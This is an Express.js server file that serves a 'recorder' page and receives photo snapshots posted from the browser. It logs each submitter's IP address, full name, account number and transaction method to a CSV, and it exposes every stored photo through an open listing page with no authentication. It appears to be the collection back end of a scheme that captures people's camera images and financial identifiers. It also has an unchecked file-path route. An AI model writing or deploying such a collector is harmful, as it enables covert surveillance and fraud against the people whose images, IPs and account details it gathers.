// server.js
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const app = express();
const PORT = process.env.PORT || 10000;

// Very important behind Render / proxies
app.set("trust proxy", true);

// ---------- Helpers ----------
function getClientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.ip;
}

// Ensure /uploads exists
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Multer storage for photo snapshots
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname || ".png");
    const name = `${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`;
    cb(null, name);
  }
});

const upload = multer({ storage });

// ---------- Middleware ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (recorder.html, recorder.js, etc.)
app.use(express.static(path.join(__dirname, "public")));

// ---------- Routes ----------

// Health check / root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "recorder.html"));
});

// Handle photo upload (called from recorder.js)
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  if (!req.file) {
    return res.status(400).send("No photo uploaded");
  }

  const clientIp = getClientIp(req);
  const fileName = req.file.filename;

  const { fullName = "", accountNumber = "", transactionMethod = "" } = req.body;

  // Log to console
  console.log("Upload from IP:", clientIp, "file:", fileName);

  // Also append to a CSV-style log (ephemeral on free tier)
  const logLine = [
    new Date().toISOString(),
    clientIp,
    JSON.stringify(fullName),
    JSON.stringify(accountNumber),
    JSON.stringify(transactionMethod),
    fileName
  ].join(",") + "\n";

  fs.appendFile(path.join(__dirname, "upload-log.csv"), logLine, err => {
    if (err) console.error("Failed to write log:", err);
  });

  // Respond to browser
  res.send(`Photo stored as: ${fileName} (IP: ${clientIp})`);
});

// Serve individual files by name
app.get("/files/:name", (req, res) => {
  const filePath = path.join(uploadDir, req.params.name);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }
  res.sendFile(filePath);
});

// Simple listing page for uploaded photos
app.get("/files-list", (req, res) => {
  fs.readdir(uploadDir, (err, files) => {
    if (err) {
      return res.status(500).send("Error reading uploads directory");
    }
    const listItems = files
      .map(f => `<li><a href="/files/${encodeURIComponent(f)}">${f}</a></li>`)
      .join("");
    res.send(`
      <h1>Uploaded Photos</h1>
      <ul>${listItems}</ul>
    `);
  });
});

// ---------- Start server ----------
app.listen(PORT, () => {
  console.log(`Listening on ${PORT}`);
});
